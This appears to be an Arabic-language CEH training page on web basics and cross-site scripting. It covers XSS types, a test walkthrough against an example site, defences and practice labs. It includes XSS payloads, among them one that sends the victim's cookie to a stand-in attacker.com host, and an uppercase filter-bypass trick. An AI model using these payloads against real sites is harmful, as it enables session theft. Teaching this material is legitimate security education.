@@ -1,0 +1,237 @@
+<!-- =======================================================
+     CEH MODULE 14: HACKING WEB APPLICATIONS (XSS)
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod14" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🌐</span> Module 14: Web App Hacking (Part 1 - XSS)</h2>
+    <p class="hero-tagline">أساسيات الويب، بروتوكولات HTTP/HTTPS، وفهم واستغلال ثغرة Cross Site Scripting (XSS) من الصفر للاحتراف.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:#ffb86c;"></span> Module 14</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:#ff5555;"></span> Web Exploitation</span>
+    </div>
+  </div>
+
+  <!-- WEB BASICS -->
+  <div class="cyber-card" style="border-top:3px solid #ffb86c;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ffb86c;">🌐 أولاً: أساسيات الويب (لازم تفهمها)</h3>
+    </div>
+    
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:15px; margin-top:15px;">
+      <div style="background:rgba(0,0,0,0.3); border:1px solid #44475a; border-radius:8px; padding:15px;">
+        <h5 style="color:#8be9fd; margin-top:0; font-size: 1.1em;">🧠 Website vs Web Application</h5>
+        <ul style="color:#aaa; font-size:0.9em; padding-right: 20px;">
+          <li><strong>Website:</strong> عرض معلومات بس (Static).</li>
+          <li><strong>Web App:</strong> فيه تفاعل (Login / Upload / Search).</li>
+        </ul>
+      </div>
+      <div style="background:rgba(0,0,0,0.3); border:1px solid #44475a; border-radius:8px; padding:15px;">
+        <h5 style="color:#50fa7b; margin-top:0; font-size: 1.1em;">🔐 HTTPS</h5>
+        <ul style="color:#aaa; font-size:0.9em; padding-right: 20px;">
+          <li>عبارة عن <strong>HTTP + SSL</strong>.</li>
+          <li>بيشفر البيانات بينك وبين السيرفر.</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- HTTP Requests -->
+    <div style="margin-top:20px; border:1px solid rgba(139,233,253,0.4); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(139,233,253,0.1); padding:10px 15px;">
+        <strong style="color:#8be9fd; font-size:1.05em;">🔹 HTTP Protocol & Requests</strong>
+        <span style="display:block; color:#aaa; font-size:0.85em; margin-top:5px;">هو اللي بيحصل بينك وبين السيرفر</span>
+      </div>
+      <div style="padding:15px; display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+        <div>
+          <strong style="color:#50fa7b;">🟢 GET Request</strong>
+          <p style="color:#aaa; font-size:0.85em;">البيانات بتظهر بوضوح في الـ URL.</p>
+          <div class="cmd-ui-box" style="font-size:0.85em;">GET /search?q=test</div>
+        </div>
+        <div>
+          <strong style="color:#bd93f9;">🟣 POST Request</strong>
+          <p style="color:#aaa; font-size:0.85em;">البيانات بتتبعت مخفية داخل الـ Body.</p>
+          <div class="cmd-ui-box" style="font-size:0.85em;">POST /login<br>username=admin&password=123</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Burp Suite & Languages -->
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:15px;">
+      <div style="border:1px solid rgba(255,85,85,0.4); border-radius:8px; padding:15px;">
+        <strong style="color:#ff5555; font-size:1.1em;">🧰 Burp Suite (مهم جدًا 🔥)</strong>
+        <ul style="color:#aaa; font-size:0.9em; padding-right: 20px; margin-top: 10px;">
+          <li><strong>Intercept requests:</strong> اعتراض الطلبات قبل وصولها للسيرفر.</li>
+          <li><strong>تعديل البيانات:</strong> التلاعب بالقيم والمدخلات.</li>
+          <li><strong>اختبار الثغرات:</strong> البحث عن XSS و SQLi وغيرها.</li>
+        </ul>
+      </div>
+      <div>
+        <table class="meth-table" style="margin-top:0;">
+          <thead>
+            <tr>
+              <th>لغات الويب المهمة</th>
+              <th>مكان تنفيذها</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr><td><strong>HTML</strong></td><td>Client</td></tr>
+            <tr><td><strong>JavaScript</strong></td><td>Client</td></tr>
+            <tr><td><strong>PHP</strong></td><td>Server</td></tr>
+            <tr><td><strong>SQL</strong></td><td>Database</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- WHAT IS XSS -->
+  <div class="cyber-card" style="border-top:3px solid #ff5555;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff5555;">💣 ثغرة XSS (Cross Site Scripting)</h3>
+    </div>
+    
+    <div style="background:rgba(255,85,85,0.1); border-left:4px solid #ff5555; padding:15px; margin-top:15px;">
+      <strong style="color:#ff5555; font-size:1.1em;">🧠 يعني إيه XSS؟</strong>
+      <p style="color:#f8f8f2; margin-top:5px; margin-bottom:5px;">هي إدخال كود JavaScript خبيث في الموقع ليتم تنفيذه في متصفح الضحية.</p>
+      <div style="color:#aaa; font-size:0.9em;">
+        <strong>👉 الهدف: </strong> سرقة Cookies • سرقة Sessions • توجيه (Redirect) المستخدم لموقع خبيث.
+      </div>
+    </div>
+
+    <h4 style="color:#bd93f9; margin-top:25px; border-bottom:1px solid #44475a; padding-bottom:5px;">🔥 أنواع الـ XSS</h4>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(280px,1fr)); gap:15px; margin-top:15px;">
+      <div style="background:rgba(0,0,0,0.3); border:1px solid #44475a; border-radius:8px; padding:15px;">
+        <h5 style="color:#50fa7b; margin-top:0; font-size: 1.1em;">1️⃣ Reflected XSS</h5>
+        <p style="color:#aaa; font-size:0.9em;">بيظهر في نفس الصفحة ومش محفوظ على السيرفر (بيعتمد إن الضحية يفتح اللينك).</p>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-bottom:5px;">&lt;script&gt;alert(1)&lt;/script&gt;</div>
+        <span style="color:#6272a4; font-size:0.85em;">👉 لو الموقع رجعه في الصفحة واشتغل = XSS 🔥</span>
+      </div>
+      
+      <div style="background:rgba(0,0,0,0.3); border:1px solid #ff5555; border-radius:8px; padding:15px; box-shadow: 0 0 10px rgba(255,85,85,0.1);">
+        <h5 style="color:#ff5555; margin-top:0; font-size: 1.1em;">2️⃣ Stored XSS 🔥 <span style="font-size:0.7em; background:#ff5555; color:#fff; padding:2px 6px; border-radius:4px;">أخطر نوع</span></h5>
+        <p style="color:#aaa; font-size:0.9em;">الكود <strong>بيتخزن</strong> في السيرفر أو قاعدة البيانات بشكل دائم.</p>
+        <ul style="color:#aaa; font-size:0.85em; padding-right: 20px;">
+          <li><strong>مثال:</strong> Comment box.</li>
+          <li>لما أي حد يفتح الصفحة اللي فيها الكومنت → الكود يشتغل فوراً.</li>
+        </ul>
+      </div>
+
+      <div style="background:rgba(0,0,0,0.3); border:1px solid #44475a; border-radius:8px; padding:15px;">
+        <h5 style="color:#f1fa8c; margin-top:0; font-size: 1.1em;">3️⃣ DOM-based XSS</h5>
+        <p style="color:#aaa; font-size:0.9em;">المشكلة بتكون في كود الـ JavaScript نفسه اللي شغال عند الـ Client، وبيغير في الـ DOM من غير ما يرجع للسيرفر.</p>
+      </div>
+    </div>
+
+    <!-- Payloads -->
+    <h4 style="color:#50fa7b; margin-top:25px; border-bottom:1px solid #44475a; padding-bottom:5px;">💉 أمثلة على الـ Payloads</h4>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:15px;">
+      <div>
+        <strong style="color:#8be9fd;">🔹 سرقة الـ Cookie:</strong>
+        <div class="cmd-ui-box" style="margin-top:5px; font-size:0.85em;">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
+      </div>
+      <div>
+        <strong style="color:#8be9fd;">🔹 إرسال البيانات لسيرفر الهاكر:</strong>
+        <div class="cmd-ui-box" style="margin-top:5px; font-size:0.85em;">&lt;script&gt;location='http://attacker.com?c='+document.cookie&lt;/script&gt;</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TESTING & PRACTICAL LAB -->
+  <div class="cyber-card" style="border-top:3px solid #50fa7b;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#50fa7b;">⚙️ اختبار XSS عملي خطوة بخطوة</h3>
+    </div>
+    
+    <div style="display:flex; justify-content:space-between; margin-top:20px; text-align:center;">
+      <div style="flex:1; padding:10px; border-left:1px dashed #44475a;">
+        <div style="font-size:2em; margin-bottom:10px;">🔍</div>
+        <strong style="color:#8be9fd;">Step 1: جرب الـ Input</strong>
+        <p style="color:#aaa; font-size:0.85em;">دور على أي مكان بياخد مدخلات زي الـ Search box أو الـ Comments.</p>
+      </div>
+      <div style="flex:1; padding:10px; border-left:1px dashed #44475a;">
+        <div style="font-size:2em; margin-bottom:10px;">💉</div>
+        <strong style="color:#ffb86c;">Step 2: جرب Payload</strong>
+        <div class="cmd-ui-box" style="font-size:0.75em; display:inline-block; margin-top:5px;">&lt;script&gt;alert(1)&lt;/script&gt;</div>
+      </div>
+      <div style="flex:1; padding:10px;">
+        <div style="font-size:2em; margin-bottom:10px;">🔥</div>
+        <strong style="color:#ff5555;">Step 3: لو اشتغل!</strong>
+        <p style="color:#aaa; font-size:0.85em;">لو البوب أب (Alert) ظهر، الموقع Vulnerable للـ XSS!</p>
+      </div>
+    </div>
+
+    <!-- Practical Example terminal -->
+    <div style="background:#282a36; border:1px solid #44475a; border-radius:8px; padding:15px; margin-top:25px; font-family: monospace;">
+      <div style="color:#6272a4; margin-bottom:5px;"># مثال عملي كامل على رابط حقيقي</div>
+      <div style="color:#f8f8f2;"><span style="color:#50fa7b;">Target URL:</span> http://site.com/search?q=test</div>
+      <div style="color:#6272a4; margin-top:15px; margin-bottom:5px;"># الخطوة 1: حقن البايلود في الـ Parameter</div>
+      <div style="color:#f8f8f2;"><span style="color:#ffb86c;">Injecting:</span> http://site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</div>
+      <div style="color:#6272a4; margin-top:15px;"># النتيجة: لو المتصفح نفذ الكود وظهر Alert 1</div>
+      <div style="color:#ff5555; font-weight:bold;">👉 Boom! Reflected XSS 🔥</div>
+    </div>
+
+    <!-- Bypass and Locations -->
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:20px;">
+      <div style="background:rgba(241,250,140,0.05); border:1px solid rgba(241,250,140,0.3); border-radius:8px; padding:15px;">
+        <strong style="color:#f1fa8c; font-size:1.1em;">🚫 لو فيه فلترة (Filtering Bypass)</strong>
+        <p style="color:#aaa; font-size:0.9em; margin-top:5px;">لو كتبت <code>&lt;script&gt;</code> والموقع عملها Block ❌</p>
+        <strong style="color:#50fa7b; font-size:0.9em;">✅ الحل (Bypass):</strong>
+        <p style="color:#aaa; font-size:0.85em;">غير حالة الأحرف (Capitalize):</p>
+        <div class="cmd-ui-box" style="font-size:0.85em;">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</div>
+      </div>
+      <div style="background:rgba(189,147,249,0.05); border:1px solid rgba(189,147,249,0.3); border-radius:8px; padding:15px;">
+        <strong style="color:#bd93f9; font-size:1.1em;">🧠 أماكن تدور فيها على XSS</strong>
+        <ul style="color:#aaa; font-size:0.9em; margin-top:10px; padding-right: 20px;">
+          <li>Search Boxes</li>
+          <li>Login Pages</li>
+          <li>Comment Sections</li>
+          <li>URL Parameters</li>
+          <li>Contact Forms</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- COUNTERMEASURES & EXTRAS -->
+  <div class="cyber-card" style="border-top:3px solid #ff79c6;">
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:20px;">
+      
+      <div>
+        <h3 style="margin:0; color:#ff79c6;">🔐 حماية XSS</h3>
+        <ul style="color:#aaa; font-size:0.9em; margin-top:10px; padding-right: 20px;">
+          <li><strong>Input validation:</strong> فلترة المدخلات.</li>
+          <li><strong>Output encoding:</strong> تشفير البيانات قبل عرضها في الصفحة.</li>
+          <li><strong>استخدام CSP:</strong> (Content Security Policy) لمنع السكريبتات الخارجية.</li>
+        </ul>
+      </div>
+
+      <div style="border-right: 1px solid #44475a; padding-right:20px;">
+        <h3 style="margin:0; color:#8be9fd;">🧪 Labs & Bug Bounty 💰</h3>
+        <p style="color:#aaa; font-size:0.9em; margin-top:10px;">
+          👉 <strong>أفضل مكان للتدريب:</strong> <code>PortSwigger Labs</code> للتدرب على (Reflected, Stored, DOM).<br><br>
+          🔥 <strong>Bug Bounty:</strong> ثغرة الـ XSS شائعة جداً وممكن تجيبلك آلاف الدولارات في منصات صيد الثغرات.
+        </p>
+      </div>
+
+    </div>
+
+    <!-- Summary Table -->
+    <div style="margin-top:25px;">
+      <h3 style="margin:0 0 10px 0; color:#f8f8f2;">💡 خلاصة قوية</h3>
+      <table class="meth-table">
+        <thead>
+          <tr>
+            <th>النوع (Type)</th>
+            <th>مستوى الخطورة (Severity)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td><strong>Reflected</strong></td><td style="color:#ffb86c;">متوسط (Medium)</td></tr>
+          <tr><td><strong>Stored</strong></td><td style="color:#ff5555; font-weight:bold;">عالي جداً 🔥 (High/Critical)</td></tr>
+          <tr><td><strong>DOM-based</strong></td><td style="color:#f1fa8c;">Tricky (صعب اكتشافه)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+</div>
